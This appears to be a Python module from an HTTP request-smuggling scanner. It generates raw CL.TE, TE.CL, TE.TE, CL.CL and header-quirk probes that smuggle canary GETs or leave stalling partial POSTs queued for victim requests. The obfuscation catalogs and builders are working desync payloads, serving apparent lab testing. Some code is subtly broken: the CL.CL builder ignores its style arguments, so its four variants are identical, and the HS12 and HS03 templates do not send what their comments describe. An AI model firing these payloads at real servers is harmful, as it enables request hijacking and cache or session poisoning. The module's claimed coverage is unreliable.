"""The ambiguity matrix: every request-framing disagreement we know how to
express as raw bytes.

A `Variant` knows how to build three kinds of probes:
  * "control" — benign framing, must never trigger a smuggle signal
  * "timing"  — deliberately leaves a queued message unfinished; if the two
                parsers disagree, the follow-up ("victim") request is delayed
  * "canary"  — smuggles a complete GET to a unique canary endpoint; detection
                uses both the response that gets misrouted to the victim and
                the lab's independent state channel

Stylistic axes (Transfer-Encoding obfuscation, Content-Length obfuscation,
chunk-size quirks, end-of-line flavor) are combined with the four structural
families CL.TE / TE.CL / TE.TE / CL.CL.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable, Literal

from .raw_http import CR, CRLF, LF, RawRequest

ProbeKind = Literal["control", "timing", "canary"]


# ---------------------------------------------------------------------------
# Style catalogs
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class TEStyle:
    sid: str
    description: str
    headers: tuple[tuple[bytes | None, bytes], ...]
    strict_chunked: bool   # RFC-strict parser treats request as chunked
    lenient_chunked: bool  # tolerant parser treats request as chunked


@dataclass(frozen=True)
class CLStyle:
    sid: str
    description: str
    headers: tuple[tuple[bytes | None, bytes], ...]
    strict_accepts: bool   # RFC-strict parser accepts the length value
    value: int | None      # numeric length a lenient parser would use, if any


def _h(name: str, value: str) -> tuple[bytes, bytes]:
    return name.encode(), value.encode()


TE_STYLES: list[TEStyle] = [
    TEStyle("TE01", "canonical chunked",
            (_h("Transfer-Encoding", "chunked"),), True, True),
    TEStyle("TE02", "mixed case Chunked",
            (_h("Transfer-Encoding", "Chunked"),), True, True),
    TEStyle("TE03", "all caps CHUNKED",
            (_h("Transfer-Encoding", "CHUNKED"),), True, True),
    TEStyle("TE04", "leading space before value",
            (_h("Transfer-Encoding", " chunked"),), True, True),
    TEStyle("TE05", "multiple leading spaces",
            (_h("Transfer-Encoding", "   chunked"),), True, True),
    TEStyle("TE06", "tab before value",
            (_h("Transfer-Encoding", "\tchunked"),), True, True),
    TEStyle("TE07", "space before colon",
            (_h("Transfer-Encoding ", "chunked"),), False, True),
    TEStyle("TE08", "tab before colon",
            (_h("Transfer-Encoding\t", "chunked"),), False, True),
    TEStyle("TE09", "space on both sides of colon",
            (_h("Transfer-Encoding ", " chunked"),), False, True),
    TEStyle("TE10", "comma list chunked, identity",
            (_h("Transfer-Encoding", "chunked, identity"),), False, True),
    TEStyle("TE11", "comma list identity, chunked",
            (_h("Transfer-Encoding", "identity, chunked"),), False, True),
    TEStyle("TE12", "gzip then chunked",
            (_h("Transfer-Encoding", "gzip, chunked"),), True, True),
    TEStyle("TE13", "trailing space on value",
            (_h("Transfer-Encoding", "chunked "),), True, True),
    TEStyle("TE14", "trailing tab on value",
            (_h("Transfer-Encoding", "chunked\t"),), False, True),
    TEStyle("TE15", "chunked with extension-style parameter",
            (_h("Transfer-Encoding", "chunked; foo=bar"),), False, True),
    TEStyle("TE16", "prefixed bogus token xchunked",
            (_h("Transfer-Encoding", "xchunked"),), False, False),
    TEStyle("TE17", "NUL byte appended to value",
            ((b"Transfer-Encoding", b"chunked\x00"),), False, False),
    TEStyle("TE18", "duplicate TE: chunked then x (first wins vs last wins)",
            (_h("Transfer-Encoding", "chunked"),
             _h("Transfer-Encoding", "x")), True, True),
    TEStyle("TE19", "duplicate TE: x then chunked",
            (_h("Transfer-Encoding", "x"),
             _h("Transfer-Encoding", "chunked")), True, True),
    TEStyle("TE20", "duplicate TE, second line has space before colon",
            (_h("Transfer-Encoding", "chunked"),
             (b"Transfer-Encoding ", b"x")), False, True),
    TEStyle("TE21", "obs-fold continuation under TE",
            ((b"Transfer-Encoding", b"chunked"),
             (None, b" X-Folded: keep-alive")), True, True),
    TEStyle("TE22", "lowercase header name",
            (_h("transfer-encoding", "chunked"),), True, True),
    TEStyle("TE23", "identity only (explicitly not chunked)",
            (_h("Transfer-Encoding", "identity"),), False, False),
    TEStyle("TE24", "duplicate TE, second line tab-before-colon",
            (_h("Transfer-Encoding", "chunked"),
             (b"Transfer-Encoding\t", b"x")), False, True),
]


def _cl(value: str) -> tuple[bytes, bytes]:
    return b"Content-Length", value.encode()


CL_STYLES: list[CLStyle] = [
    CLStyle("CL01", "canonical length", (_cl("11"),), True, 11),
    CLStyle("CL02", "duplicate identical length",
            (_cl("11"), _cl("11")), True, 11),
    CLStyle("CL03", "duplicate conflicting length (11 vs 12)",
            (_cl("11"), _cl("12")), False, 12),
    CLStyle("CL04", "conflicting length, small first (4 vs 11)",
            (_cl("4"), _cl("11")), False, 11),
    CLStyle("CL05", "comma list identical (11, 11)",
            (_cl("11, 11"),), False, 11),
    CLStyle("CL06", "comma list conflicting (11, 12)",
            (_cl("11, 12"),), False, 12),
    CLStyle("CL07", "leading zero (011)",
            (_cl("011"),), False, 11),
    CLStyle("CL08", "explicit plus sign (+11)",
            (_cl("+11"),), False, 11),
    CLStyle("CL09", "leading space in value",
            (_cl(" 11"),), True, 11),
    CLStyle("CL10", "trailing spaces in value",
            (_cl("11 "),), False, 11),
    CLStyle("CL11", "tab inside value",
            (_cl("11\t"),), False, 11),
    CLStyle("CL12", "hex notation (0xb)",
            (_cl("0xb"),), False, None),
    CLStyle("CL13", "negative length",
            (_cl("-1"),), False, None),
    CLStyle("CL14", "duplicate headers with different name casing",
            ((b"Content-Length", b"11"),
             (b"content-length", b"12")), False, 12),
    CLStyle("CL15", "space before colon",
            ((b"Content-Length ", b"11"),), False, 11),
]


CHUNK_QUIRKS: list[tuple[str, str, Callable[[int, bytes], bytes]]] = [
    # (id, description, renderer(size, eol) -> size-line bytes)
    ("CQ01", "uppercase hex digits", lambda n, eol: f"{n:X}".encode() + eol),
    ("CQ02", "leading zero padding", lambda n, eol: f"0{n:x}".encode() + eol),
    ("CQ03", "chunk extension", lambda n, eol: f"{n:x};a=b".encode() + eol),
    ("CQ04", "space after chunk size", lambda n, eol: f"{n:x} ".encode() + eol),
    ("CQ05", "tab after chunk size", lambda n, eol: f"{n:x}\t".encode() + eol),
    ("CQ06", "leading space before size", lambda n, eol: f" {n:x}".encode() + eol),
    ("CQ07", "plus-prefixed size", lambda n, eol: f"+{n:x}".encode() + eol),
    ("CQ08", "0x-prefixed size", lambda n, eol: f"0x{n:x}".encode() + eol),
    ("CQ09", "bare LF chunk framing", lambda n, eol: f"{n:x}".encode() + LF),
    ("CQ10", "lone CR chunk framing", lambda n, eol: f"{n:x}".encode() + CR),
]


EOL_STYLES: list[tuple[str, str, bytes]] = [
    ("EOL-CRLF", "standard CRLF", CRLF),
    ("EOL-LF", "bare line feed (LF only)", LF),
    ("EOL-CR", "lone carriage return (CR only)", CR),
]


# ---------------------------------------------------------------------------
# Probe context and body templates
# ---------------------------------------------------------------------------

@dataclass
class ProbeContext:
    marker: str
    host: str
    canary_path: str
    ping_path: str = "/__smuggler/ping"

    def smuggled_get(self, eol: bytes) -> bytes:
        lines = [
            f"GET {self.canary_path} HTTP/1.1",
            f"Host: {self.host}",
            f"X-Smuggler-Marker: {self.marker}",
            "",
            "",
        ]
        return eol.join(s.encode() for s in lines)


@dataclass
class Variant:
    vid: str
    family: str
    name: str
    ambiguity: str
    tags: list[str]
    build: Callable[[ProbeContext, ProbeKind], RawRequest]
    evidence: dict = field(default_factory=dict)


def _base_headers(ctx: ProbeContext) -> list[tuple[bytes, bytes]]:
    return [(b"Host", ctx.host.encode()),
            (b"User-Agent", b"smuggler/0.1"),
            (b"Connection", b"keep-alive")]


def _req(ctx: ProbeContext, headers: list, body: bytes, eol: bytes,
         method: str = "POST", target: str = "/") -> RawRequest:
    return RawRequest(method=method, target=target, headers=list(headers),
                      body=body, eol=eol)


# ---------------------------------------------------------------------------
# Family: CL.TE — front-end counts Content-Length, back-end honors TE
# ---------------------------------------------------------------------------

# Declared body length for the deliberately unfinished message in timing
# probes. Far larger than the follow-up victim request so the back-end can
# never complete it from in-flight bytes and must block until its read
# timeout — producing the stall the engine measures.
UNDERFULL_CL = 50_000


def _incomplete_post(eol: bytes, ctx: ProbeContext) -> bytes:
    # A partial POST the back-end keeps waiting to finish: declared
    # Content-Length exceeds what we send, so the next real request blocks.
    lines = [
        "POST / HTTP/1.1",
        f"Host: {ctx.host}",
        "Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {UNDERFULL_CL}",
        "",
        "x=",
    ]
    return eol.join(s.encode() for s in lines)


def build_clte(te: TEStyle, eol: bytes, ctx: ProbeContext,
               kind: ProbeKind, chunk_render=None) -> RawRequest:
    if kind == "control":
        body = b"0" + eol + eol
    elif kind == "timing":
        # Terminated chunk, then an unfinished POST the back-end blocks on.
        body = b"0" + eol + eol + _incomplete_post(eol, ctx)
    else:
        body = b"0" + eol + eol + ctx.smuggled_get(eol)
    if chunk_render is not None:
        # Re-render the terminating chunk size line with the quirk.
        body = chunk_render(0, eol) + body[len(b"0" + eol):]
    headers = _base_headers(ctx)
    headers.append((b"Content-Length", str(len(body)).encode()))
    headers.extend(te.headers)
    return _req(ctx, headers, body, eol)


# ---------------------------------------------------------------------------
# Family: TE.CL — front-end honors TE, back-end counts Content-Length
# ---------------------------------------------------------------------------

def build_tecl(te: TEStyle, cl_len_override: int | None, eol: bytes,
               ctx: ProbeContext, kind: ProbeKind,
               gpost: bool = False) -> RawRequest:
    if kind == "control":
        smuggled = b""
    elif kind == "timing":
        # GPOST trick: back-end assembles a POST whose declared body never
        # fully arrives, so it blocks and the next request queues behind it.
        lines = [
            "GPOST / HTTP/1.1",
            f"Host: {ctx.host}",
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {UNDERFULL_CL}",
            "",
            "x=",
        ]
        smuggled = eol.join(s.encode() for s in lines)
    else:
        smuggled = b"G" + ctx.smuggled_get(eol) if gpost else ctx.smuggled_get(eol)
    payload = smuggled
    size_line = f"{len(payload):x}".encode() + eol
    cl_value = cl_len_override if cl_len_override is not None else len(size_line)
    # Valid chunked framing for the TE-honoring side: size line, data, CRLF,
    # terminating 0-chunk. The CL-honoring side only reads the size line's
    # worth of bytes as its body, leaving `payload` queued.
    body = size_line + payload + eol + b"0" + eol + eol
    headers = _base_headers(ctx)
    headers.append((b"Content-Length", str(cl_value).encode()))
    headers.extend(te.headers)
    return _req(ctx, headers, body, eol)


# ---------------------------------------------------------------------------
# Family: TE.TE — both sides see TE headers but disagree on which wins
# ---------------------------------------------------------------------------

def build_tete(first_headers: tuple, second_headers: tuple, eol: bytes,
               ctx: ProbeContext, kind: ProbeKind) -> RawRequest:
    if kind == "control":
        body = b"0" + eol + eol
    elif kind == "timing":
        body = b"0" + eol + eol + _incomplete_post(eol, ctx)
    else:
        body = b"0" + eol + eol + ctx.smuggled_get(eol)
    headers = _base_headers(ctx)
    # The CL-fallback side needs a real Content-Length spanning the whole
    # body; the chunked-honoring side ignores it.
    headers.append((b"Content-Length", str(len(body)).encode()))
    headers.extend(first_headers)
    headers.extend(second_headers)
    return _req(ctx, headers, body, eol)


# ---------------------------------------------------------------------------
# Family: CL.CL — duplicate Content-Length, parsers pick different values
# ---------------------------------------------------------------------------

def build_clcl(total_style: CLStyle, prefix_style: CLStyle, eol: bytes,
               ctx: ProbeContext, kind: ProbeKind) -> RawRequest:
    prefix = b"x=1&"
    if kind == "control":
        tail = b""
    elif kind == "timing":
        tail = _incomplete_post(eol, ctx)
    else:
        tail = ctx.smuggled_get(eol)
    full = prefix + tail
    headers = _base_headers(ctx)
    # Re-encode both styles with the real lengths so each header is internally
    # numeric; the disagreement is between the two values.
    headers.append((b"Content-Length", str(len(full)).encode()))
    headers.append((b"Content-Length", str(len(prefix)).encode()))
    return _req(ctx, headers, full, eol)


# ---------------------------------------------------------------------------
# Family: header / request-line quirks (passthrew vs. strict rejection)
# ---------------------------------------------------------------------------

def build_header_smuggle(template_id: str, eol: bytes,
                         ctx: ProbeContext, kind: ProbeKind) -> RawRequest:
    marker_line = (
        f"GET {ctx.canary_path} HTTP/1.1{eol.decode()}"
        f"Host: {ctx.host}{eol.decode()}"
        f"X-Smuggler-Marker: {ctx.marker}{eol.decode()}{eol.decode()}"
    ).encode()
    headers: list = _base_headers(ctx)
    headers.append((b"Content-Length", b"6"))
    method, target = "POST", "/"

    if template_id == "HS01":
        # CRLF injection inside a header value (naive h1 rebuild / h2 downgrade)
        headers.append((None, b"X-Data: a" + eol + marker_line))
    elif template_id == "HS02":
        # obs-fold that a non-folding parser may turn into a new line
        headers.append((b"X-Data", b"a"))
        headers.append((None, b" " + marker_line))
    elif template_id == "HS03":
        # tab-separated request line
        return RawRequest(method="POST", target="/", version="HTTP/1.1",
                          headers=headers + [
                              (None, b"POST\t/\tHTTP/1.1")],
                          body=b"x=1&y=2", eol=eol)
    elif template_id == "HS04":
        # absolute-form request target
        target = f"http://{ctx.host}/"
        headers.append((b"Content-Type", b"application/x-www-form-urlencoded"))
    elif template_id == "HS05":
        # duplicate Host
        headers.append((b"Host", b"evil.example"))
    elif template_id == "HS06":
        # NUL inside header value
        headers.append((b"X-Data", b"a\x00b"))
    elif template_id == "HS07":
        # Expect: 100-continue divergence
        headers.append((b"Expect", b"100-continue"))
    elif template_id == "HS08":
        # lowercase method
        method = "post"
    elif template_id == "HS09":
        # HTTP/1.0 keep-alive hop
        return RawRequest(method="POST", target="/", version="HTTP/1.0",
                          headers=headers + [(b"Connection", b"keep-alive")],
                          body=b"x=1&y=2", eol=eol)
    elif template_id == "HS10":
        # header name with trailing space (parsers disagree on field identity)
        headers.append((b"Content-Length ", b"6"))
    elif template_id == "HS11":
        # folded TE via obs-fold
        headers.append((b"Transfer-Encoding", b"chunked"))
        headers.append((None, b" X-Cont: 1"))
        return RawRequest(method="POST", target="/", headers=headers,
                          body=b"0" + eol + eol +
                          (b"" if kind == "control" else marker_line),
                          eol=eol)
    elif template_id == "HS12":
        # double space in request line
        return RawRequest(method="POST", target="/", version="HTTP/1.1",
                          headers=headers,
                          body=b"x=1&y=2", eol=eol)
    body = b"x=1&y=2"
    if template_id in ("HS01", "HS02", "HS11") and kind == "control":
        # Control variant: same encoding, no injected request line.
        return _req(ctx, [(b"Host", ctx.host.encode()),
                          (b"Content-Length", b"3")], b"a=1", eol)
    return _req(ctx, headers, body, eol, method=method, target=target)


# ---------------------------------------------------------------------------
# Registry construction
# ---------------------------------------------------------------------------

def build_registry() -> list[Variant]:
    registry: list[Variant] = []

    # CL.TE across every TE obfuscation × EOL flavor (EOL subset to keep size
    # sane: CRLF and bare-LF; lone-CR is exercised via dedicated variants).
    for te in TE_STYLES:
        for eid, ename, eol in EOL_STYLES[:2]:
            registry.append(Variant(
                vid=f"CLTE-{te.sid}-{eid}",
                family="CL.TE",
                name=f"CL.TE via {te.description} ({ename})",
                ambiguity=("front-end uses Content-Length; back-end recognizes "
                           f"TE ({te.description}) and switches to chunked"),
                tags=["clte", eid.lower(), te.sid.lower()],
                build=lambda c, k, te=te, eol=eol: build_clte(te, eol, c, k),
            ))

    # CL.TE with chunk-size parser quirks.
    for cid, cdesc, render in CHUNK_QUIRKS:
        registry.append(Variant(
            vid=f"CLTE-{cid}",
            family="CL.TE",
            name=f"CL.TE with chunk quirk: {cdesc}",
            ambiguity=f"chunk-size line rendered as {cdesc}",
            tags=["clte", "chunk-quirk", cid.lower()],
            build=lambda c, k, r=render: build_clte(
                TE_STYLES[0], CRLF, c, k, chunk_render=r),
        ))

    # TE.CL across TE obfuscations (CRLF) plus bare-LF flavor.
    for te in TE_STYLES:
        registry.append(Variant(
            vid=f"TECL-{te.sid}-EOL-CRLF",
            family="TE.CL",
            name=f"TE.CL via {te.description}",
            ambiguity=("front-end honors TE chunked framing; back-end ignores "
                       "the obfuscated TE and uses Content-Length"),
            tags=["tecl", te.sid.lower()],
            build=lambda c, k, te=te: build_tecl(te, None, CRLF, c, k),
        ))
    registry.append(Variant(
        vid="TECL-GPOST-EOL-LF",
        family="TE.CL",
        name="TE.CL GPOST structure with bare LF",
        ambiguity="GPOST prefix keeps chunk arithmetic valid; LF-only framing",
        tags=["tecl", "gpost", "eol-lf"],
        build=lambda c, k: build_tecl(TE_STYLES[0], None, LF, c, k,
                                      gpost=True),
    ))

    # TE.TE ordering/obfuscation disagreements. Each pair spells out the two
    # TE header blocks so the first/last picking parsers land on different
    # verdicts about whether the body is chunked.
    te_chunked = (_h("Transfer-Encoding", "chunked"),)
    te_x = (_h("Transfer-Encoding", "x"),)
    te_space = ((b"Transfer-Encoding ", b"x"),)
    te_tab = ((b"Transfer-Encoding\t", b"x"),)
    tete_pairs = [
        ("TETE-01", te_chunked, te_x, "chunked then x",
         "first-wins parser stays chunked; last-wins parser honors 'x' (not chunked)"),
        ("TETE-02", te_x, te_chunked, "x then chunked",
         "first-wins parser honors unknown 'x'; last-wins parser stays chunked"),
        ("TETE-03", te_chunked, te_space, "chunked then space-colon x",
         "strict parser rejects the malformed second TE; lenient first-wins honors chunked"),
        ("TETE-04", te_chunked, te_tab, "chunked then tab-colon x",
         "tab-before-colon accepted by one side, rejected by the other"),
    ]
    for vid, first_headers, second_headers, desc, amb in tete_pairs:
        registry.append(Variant(
            vid=vid, family="TE.TE",
            name=f"TE.TE: {desc}",
            ambiguity=amb,
            tags=["tete"],
            build=lambda c, k, a=first_headers, b=second_headers:
            build_tete(a, b, CRLF, c, k),
        ))

    # CL.CL duplicate-length disagreements.
    clcl_pairs = [
        ("CLCL-01", CL_STYLES[2], "conflicting duplicates, last wins vs first"),
        ("CLCL-02", CL_STYLES[3], "small-first conflict"),
        ("CLCL-03", CL_STYLES[5], "comma list conflict"),
        ("CLCL-04", CL_STYLES[13], "case-different duplicate header names"),
    ]
    for vid, style, desc in clcl_pairs:
        registry.append(Variant(
            vid=vid, family="CL.CL",
            name=f"CL.CL: {desc}",
            ambiguity="two parsers each accept a different Content-Length value",
            tags=["clcl"],
            build=lambda c, k, s=style: build_clcl(s, CL_STYLES[0], CRLF, c, k),
        ))

    # Header / request-line quirks, each across CRLF and bare LF.
    for hs in range(1, 13):
        hid = f"HS{hs:02d}"
        for eid, ename, eol in EOL_STYLES[:2]:
            registry.append(Variant(
                vid=f"{hid}-{eid}",
                family="HEADER",
                name=f"header quirk {hid} ({ename})",
                ambiguity="passthrough normalization vs strict request parsing",
                tags=["header", hid.lower(), eid.lower()],
                build=lambda c, k, h=hid, e=eol: build_header_smuggle(h, e, c, k),
            ))

    # Lone-CR variants for the two main families.
    registry.append(Variant(
        vid="CLTE-EOL-CR", family="CL.TE",
        name="CL.TE with lone-CR line endings",
        ambiguity="one parser accepts CR as line terminator, the other doesn't",
        tags=["clte", "eol-cr"],
        build=lambda c, k: build_clte(TE_STYLES[0], CR, c, k),
    ))
    registry.append(Variant(
        vid="TECL-EOL-CR", family="TE.CL",
        name="TE.CL with lone-CR line endings",
        ambiguity="one parser accepts CR as line terminator, the other doesn't",
        tags=["tecl", "eol-cr"],
        build=lambda c, k: build_tecl(TE_STYLES[0], None, CR, c, k),
    ))
    return registry


REGISTRY = build_registry()
